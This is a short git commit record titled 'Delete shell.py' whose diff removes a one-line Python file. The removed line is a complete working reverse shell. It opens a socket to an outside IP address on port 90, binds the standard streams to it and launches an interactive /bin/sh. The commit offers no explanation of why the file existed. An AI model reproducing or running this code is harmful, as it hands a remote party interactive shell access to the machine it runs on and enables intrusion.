c556b50a1c45b354e383a69b4347df32844271b8
Blank233 <32098365+Blank233@users.noreply.github.com>
2019-04-09 15:37:04 +0800

    Delete shell.py

--- shell.py
+++
@@ -1,1 +0,0 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("39.105.128.57",90));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
